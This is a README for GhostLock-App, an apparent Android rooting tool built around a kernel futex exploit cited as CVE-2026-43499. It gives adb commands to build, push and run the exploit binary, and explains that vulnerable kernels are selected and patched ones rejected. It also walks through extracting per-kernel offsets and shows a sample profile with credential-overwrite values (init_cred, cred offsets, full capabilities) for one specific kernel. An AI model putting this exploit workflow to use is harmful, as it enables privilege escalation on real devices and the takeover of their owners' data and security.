# GhostLock-App

> 中文: [README_ZH.md](README_ZH.md)

## Documentation

- [Kernel Profile Porting Guide](docs/kernel_profiles/README.md) - add support for a new kernel. GhostLock matches kernels by exact `uname -r` and rejects unsupported builds, showing the status at the top of the app.
- [Supported devices](docs/kernel_profiles/SUPPORTED_DEVICES.md) - the built-in kernel list.
- [Shared execution defaults](docs/kernel_profiles/defaults.md) - every execution-tuning field, its default, and why.
- [Profile schema](docs/kernel_profiles/PROFILE_SCHEMA.md) - full profile structure and data flow.
- [Adding a component](docs/development/adding-a-component.md) - developer guide for a new native middleware / backend / frontend (Chinese).

For the complete device-porting workflow, kernel-family template links, and tuning rationale, see the [Kernel Profile Porting Guide](docs/kernel_profiles/README.md).

Rows explicitly marked **Shizuku required** run through a shell UserService. Start Shizuku with ADB and tap the status card to grant access; all other rows use the app's normal execution path.

## Quick Start

Open **GhostLock** and tap **Run**. If a privileged runtime is available, it can be used to complete the execution path; otherwise the app falls back to the direct native execution flow.

The execution chain is a pipeline of three components: a frontend (`root_child` startup/handoff), a backend (the CVE-2026-43499 futex primitive), and a middleware route. The catalogued combination is instantiated at build time and selected by the active profile.

## Command-Line Debugging

adb/shell has no seccomp filter, so W3 is skipped - handy for quick verification:

```powershell
make -C src ghostlock
./gradlew exportKernelProfiles
adb push build/native/ghostlock /data/local/tmp/ghostlock
adb push build/kernel-profiles/<release>.bin /data/local/tmp/profile.bin
adb shell chmod 755 /data/local/tmp/ghostlock
adb shell /data/local/tmp/ghostlock --load-prebuilt-profile /data/local/tmp/profile.bin
```

## Offset Extraction

`tools/extract_rs` derives offsets from a `boot.img` (plus optional `xbl_config.img`), a full OTA ZIP, or an `http(s)` URL pointing at one. kallsyms come from `--kallsyms` or are recovered from the image's embedded table. The route is suggested from kernel evidence (`--route` overrides it).

```powershell
Push-Location tools/extract_rs
cargo build --release
Pop-Location
build/extract/release/ghostlock-extract.exe boot.img --xbl-config xbl_config.img --format conf --out profile.conf
build/extract/release/ghostlock-extract.exe OTA.zip --format conf --out profile.conf
```

`--format conf` is the extractor output: a flattened, self-contained profile (no `include` lines, the shared 6.x credential/KernelSnitch constants inlined, the route selected from `--analysis` evidence or a provided override).

### MediaTek

MediaTek images have no `xbl_config.img` and usually no embedded BTF, so the extractor cannot derive the two physical addresses (`kernel_phys_load`, `kernel_phys_offset`) from the image and leaves them `null`. The runtime then falls back to the SoC formula, which fails at W1 on MediaTek. Fill both by running the separate `tools/mtk-phys/` extractor on a rooted device (it reads `/proc/iomem`) and pasting the values into the app's advanced overrides. See [MEDIATEK.md](docs/kernel_profiles/MEDIATEK.md).

### Preflight

The extractor disassembles `remove_waiter()` before extracting offsets. Kernels with the fix are rejected with exit code `6`; only vulnerable kernels continue.

### On-device analysis

A full OTA can be analyzed entirely on the phone: `boot` plus `xbl_config` are extracted automatically. Pass `--work-dir` an app-writable dir when running inside the app sandbox. Cross-compile and push:

```powershell
rustup target add aarch64-linux-android
$ndk = "$env:ANDROID_HOME\ndk\<version>\toolchains\llvm\prebuilt\windows-x86_64\bin"
$env:CC_aarch64_linux_android = "$ndk\aarch64-linux-android35-clang.cmd"
$env:AR_aarch64_linux_android = "$ndk\llvm-ar.exe"
$env:CARGO_TARGET_AARCH64_LINUX_ANDROID_LINKER = $env:CC_aarch64_linux_android
Push-Location tools/extract_rs
cargo build --release --target aarch64-linux-android
Pop-Location
adb push build/extract/aarch64-linux-android/release/ghostlock-extract /data/local/tmp/
adb shell /data/local/tmp/ghostlock-extract /sdcard/OTA.zip
```

### Importing offsets without rebuilding the app

New kernels no longer need an app rebuild: tap **Import offsets.conf (HOCON)** and pick the extractor's flattened `.conf`, or use **Import offsets.json (v1)** for an older JSON report. v1 JSON is converted in-app, so nothing has to be pushed to the device: native always starts from the GLK1 document the app sends on stdin, and matches the current `uname -r` against the resolved profile before rejecting the kernel. Imports merge across files; a release already stored prompts before overwrite.

The app can also generate the profile itself — **Parse OTA link** (full OTA ZIP URL) and **Parse image** (`boot.img` + optional `xbl_config.img`) run the extractor in-process and write a flattened `.conf` into the app data dir on success:

```hocon
# GhostLock kernel profile: 6.12.38-android16-5-g844001fb8721-ab14552068-4k (HOCON, self-contained).
release = "6.12.38-android16-5-g844001fb8721-ab14552068-4k"
schema_version = 1
kernel_major = 6
recommend_shizuku = 0
kernel_phys_load = 0xC7800000
route {
  select_stack {
    waiter_shift = 0
  }
}
fallback {
  to = "none"
}
kernelsnitch {
  collisions = 4
}
task_struct {
  prio = 148
  cred = 2304
}
cred {
  caps_offset = 48
  copy_size = 136
  usage_value = 1
  caps_count = 5
  caps_value = -1
}
offset {
  init_task = 37801728
  init_cred = 37891184
}
```

## Credits & License

Based on the following projects, licensed under Apache License 2.0 (see [LICENSE](LICENSE)):

- [NebuSec/CyberMeowfia](https://github.com/NebuSec/CyberMeowfia)
- [JoinChang/ghostlock-oneplus](https://github.com/JoinChang/ghostlock-oneplus)
- [x-spy/CVE-2026-43499-popsicle](https://github.com/x-spy/CVE-2026-43499-popsicle)
